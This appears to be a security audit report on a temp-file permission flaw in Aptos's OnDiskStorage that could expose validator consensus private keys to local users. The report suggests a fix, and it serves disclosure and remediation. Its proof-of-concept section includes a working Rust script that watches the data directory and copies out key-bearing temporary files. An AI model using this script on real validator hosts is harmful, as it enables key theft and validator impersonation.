# Audit Report

## Title
Consensus Private Key Exposure via World-Readable Temporary Files in OnDiskStorage

## Summary
The `write()` function in `OnDiskStorage` creates temporary files containing consensus private keys without setting restrictive file permissions. During the window between file creation and atomic rename, these temporary files are world-readable on Unix systems, allowing local attackers to extract validator consensus keys.

## Finding Description

The vulnerability exists in the `write()` function of `OnDiskStorage`: [1](#0-0) 

When storing consensus private keys, the function:
1. Creates a temporary file using `File::create()` without explicit permission settings
2. Writes sensitive cryptographic material (consensus private keys) to this file
3. Atomically renames the file to its final location

On Unix systems, `File::create()` without explicit permissions uses the default file creation mode (typically `0o666`) masked by the process umask (commonly `0o022`), resulting in permissions of `0o644` (owner read/write, group read, **world read**).

The consensus private key storage flow confirms this path is used for critical cryptographic material: [2](#0-1) 

Production deployments actively use `OnDiskStorage` as the consensus backend: [3](#0-2) [4](#0-3) 

The temporary file name is generated randomly but predictably in the same directory as the final file: [5](#0-4) 

The codebase demonstrates awareness of proper secure file handling elsewhere: [6](#0-5) 

**Attack Path:**
1. Attacker gains local user access to validator host (via compromised service, multi-tenant hosting, container escape, etc.)
2. Attacker monitors `/opt/aptos/data` directory for new file creation using inotify or polling
3. When `OnDiskStorage` writes a consensus key update, a temporary file appears with a random hex name
4. Attacker reads the temporary file before the `fs::rename()` completes
5. Attacker extracts the BLS12-381 consensus private key from the JSON-serialized `GetResponse` structure: [7](#0-6) 

6. Attacker can now sign consensus messages on behalf of the validator, enabling Byzantine behavior

**Invariants Broken:**
- **Cryptographic Correctness** (Invariant #10): Private key material must be protected from unauthorized access
- **Access Control** (Invariant #8): Consensus keys should only be accessible to authorized processes
- **Consensus Safety** (Invariant #2): Compromised validator keys enable equivocation and safety violations

## Impact Explanation

**Severity: High to Critical**

This vulnerability enables consensus private key extraction, which directly threatens the AptosBFT consensus protocol:

- **Consensus Safety Violations**: An attacker with the consensus private key can sign conflicting votes, enabling equivocation attacks that could break the < 1/3 Byzantine fault tolerance guarantee
- **Validator Impersonation**: The attacker can fully impersonate the validator in consensus, potentially causing chain splits or safety violations
- **Network Reputation Damage**: Compromised validators could be slashed or excluded, affecting network security

Per the Aptos bug bounty categories:
- **Critical Severity** if exploited to cause consensus/safety violations or network partition
- **High Severity** at minimum for validator key compromise and potential protocol violations

The impact is somewhat mitigated by requiring local system access, but in cloud/container environments with shared infrastructure, this is a realistic attack surface.

## Likelihood Explanation

**Likelihood: Medium**

**Requirements:**
- Local user access to the validator host system (non-root privileges sufficient)
- Ability to monitor file system events or poll the data directory
- Timing window during key writes/updates

**Realistic Scenarios:**
1. **Multi-tenant cloud hosting**: Multiple customers on shared infrastructure
2. **Compromised ancillary services**: Other processes running on validator host (monitoring agents, logging services, etc.)
3. **Container escape**: In containerized deployments, escape to host namespace
4. **Supply chain compromise**: Malicious dependencies or tools with file system access

The vulnerability is mitigated by:
- Requiring local system access (not purely network-based)
- Short timing window (though repeated attempts during key rotation are possible)
- Typical single-tenant validator deployments

However, the production configurations **actively use OnDiskStorage**, making this exploitable in real deployments despite the code comment warning against production use: [8](#0-7) 

## Recommendation

**Immediate Fix**: Set restrictive permissions (0o600) on temporary files before writing sensitive data.

**Code Fix** for `secure/storage/src/on_disk.rs`:

```rust
fn write(&self, data: &HashMap<String, Value>) -> Result<(), Error> {
    let contents = serde_json::to_vec(data)?;
    
    // Create file with restrictive permissions (owner read/write only)
    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create_new(true);
    
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    
    let mut file = opts.open(self.temp_path.path())?;
    file.write_all(&contents)?;
    drop(file); // Explicit close before rename
    
    fs::rename(&self.temp_path, &self.file_path)?;
    Ok(())
}
```

**Long-term Recommendations:**
1. Deprecate `OnDiskStorage` for production consensus key storage
2. Mandate Vault or HSM-backed storage for production validators
3. Add documentation warnings and runtime checks to prevent `OnDiskStorage` in production mode
4. Consider setting directory-level permissions on `/opt/aptos/data` to mode `0o700`

## Proof of Concept

**Attack Script** (Rust):

```rust
use notify::{Watcher, RecursiveMode, watcher};
use std::sync::mpsc::channel;
use std::time::Duration;
use std::fs;
use std::path::Path;

fn main() {
    let (tx, rx) = channel();
    let mut watcher = watcher(tx, Duration::from_secs(1)).unwrap();
    
    // Monitor the validator data directory
    watcher.watch("/opt/aptos/data", RecursiveMode::NonRecursive).unwrap();
    
    println!("Monitoring for temporary consensus key files...");
    
    loop {
        match rx.recv() {
            Ok(event) => {
                if let notify::DebouncedEvent::Create(path) = event {
                    // Check if this is a temporary file (32 hex chars)
                    if let Some(filename) = path.file_name() {
                        let name = filename.to_string_lossy();
                        if name.len() == 32 && name.chars().all(|c| c.is_ascii_hexdigit()) {
                            println!("Found temp file: {:?}", path);
                            
                            // Attempt to read before rename
                            if let Ok(contents) = fs::read_to_string(&path) {
                                println!("Contents:\n{}", contents);
                                
                                // Parse for CONSENSUS_KEY
                                if contents.contains("CONSENSUS_KEY") {
                                    println!("[!] Consensus key exposed!");
                                    // Extract and save the key material
                                    std::fs::write("extracted_key.json", contents).unwrap();
                                    break;
                                }
                            }
                        }
                    }
                }
            }
            Err(e) => println!("Watch error: {:?}", e),
        }
    }
}
```

**Steps to Reproduce:**
1. Deploy validator using OnDiskStorage backend (default docker/helm configs)
2. Run the monitoring script as any local user
3. Trigger a consensus key write (validator startup, key rotation, safety data update)
4. Observer script extracts the consensus private key from temporary file
5. Verify extracted key matches the validator's consensus key

## Notes

While the code includes a warning that `OnDiskStorage` "should not be used in production," the actual deployment configurations (Docker Compose and Terraform/Helm) actively use it as the default consensus backend. This discrepancy between code comments and real deployments makes the vulnerability practically exploitable.

The fix is straightforward and follows existing patterns in the codebase for secure file handling. The root cause is the absence of explicit permission setting despite demonstrated knowledge of this security practice elsewhere in the codebase.

### Citations

**File:** secure/storage/src/on_disk.rs (L16-22)
```rust
/// OnDiskStorage represents a key value store that is persisted to the local filesystem and is
/// intended for single threads (or must be wrapped by a Arc<RwLock<>>). This provides no permission
/// checks and simply offers a proof of concept to unblock building of applications without more
/// complex data stores. Internally, it reads and writes all data to a file, which means that it
/// must make copies of all key material which violates the code base. It violates it because
/// the anticipation is that data stores would securely handle key material. This should not be used
/// in production.
```

**File:** secure/storage/src/on_disk.rs (L64-70)
```rust
    fn write(&self, data: &HashMap<String, Value>) -> Result<(), Error> {
        let contents = serde_json::to_vec(data)?;
        let mut file = File::create(self.temp_path.path())?;
        file.write_all(&contents)?;
        fs::rename(&self.temp_path, &self.file_path)?;
        Ok(())
    }
```

**File:** consensus/safety-rules/src/persistent_safety_storage.rs (L63-81)
```rust
    fn initialize_keys_and_accounts(
        internal_store: &mut Storage,
        author: Author,
        consensus_private_key: bls12381::PrivateKey,
    ) -> Result<(), Error> {
        let result = internal_store.set(CONSENSUS_KEY, consensus_private_key);
        // Attempting to re-initialize existing storage. This can happen in environments like
        // forge. Rather than be rigid here, leave it up to the developer to detect
        // inconsistencies or why they did not reset storage between rounds. Do not repeat the
        // checks again below, because it is just too strange to have a partially configured
        // storage.
        if let Err(aptos_secure_storage::Error::KeyAlreadyExists(_)) = result {
            warn!("Attempted to re-initialize existing storage");
            return Ok(());
        }

        internal_store.set(OWNER_ACCOUNT, author)?;
        Ok(())
    }
```

**File:** docker/compose/aptos-node/validator.yaml (L7-19)
```yaml
consensus:
  safety_rules:
    service:
      type: "local"
    backend:
      type: "on_disk_storage"
      path: secure-data.json
      namespace: ~
    initial_safety_rules_config:
      from_file:
        waypoint:
          from_file: /opt/aptos/genesis/waypoint.txt
        identity_blob_path: /opt/aptos/genesis/validator-identity.yaml
```

**File:** terraform/helm/aptos-node/files/configs/validator-base.yaml (L10-22)
```yaml
consensus:
  safety_rules:
    service:
      type: "local"
    backend:
      type: "on_disk_storage"
      path: secure-data.json
      namespace: ~
    initial_safety_rules_config:
      from_file:
        waypoint:
          from_file: /opt/aptos/genesis/waypoint.txt
        identity_blob_path: /opt/aptos/genesis/validator-identity.yaml
```

**File:** crates/aptos-temppath/src/lib.rs (L36-48)
```rust
    /// Create new, uninitialized temporary path in the specified directory.
    pub fn new_with_temp_dir(temp_dir: PathBuf) -> Self {
        let mut temppath = temp_dir;
        let mut rng = rand::thread_rng();
        let mut bytes = [0_u8; 16];
        rng.fill_bytes(&mut bytes);
        temppath.push(hex::encode(bytes));

        TempPath {
            path_buf: temppath,
            persist: false,
        }
    }
```

**File:** crates/aptos/src/common/types.rs (L1083-1089)
```rust
    /// Save to the `output_file` with restricted permissions (mode 0600)
    pub fn save_to_file_confidential(&self, name: &str, bytes: &[u8]) -> CliTypedResult<()> {
        let mut opts = OpenOptions::new();
        #[cfg(unix)]
        opts.mode(0o600);
        write_to_file_with_opts(self.output_file.as_path(), name, bytes, &mut opts)
    }
```

**File:** secure/storage/src/kv_storage.rs (L54-63)
```rust
/// A container for a get response that contains relevant metadata and the value stored at the
/// given key.
#[derive(Debug, Deserialize, PartialEq, Eq, Serialize)]
#[serde(tag = "data")]
pub struct GetResponse<T> {
    /// Time since Unix Epoch in seconds.
    pub last_update: u64,
    /// Value stored at the provided key
    pub value: T,
}
```
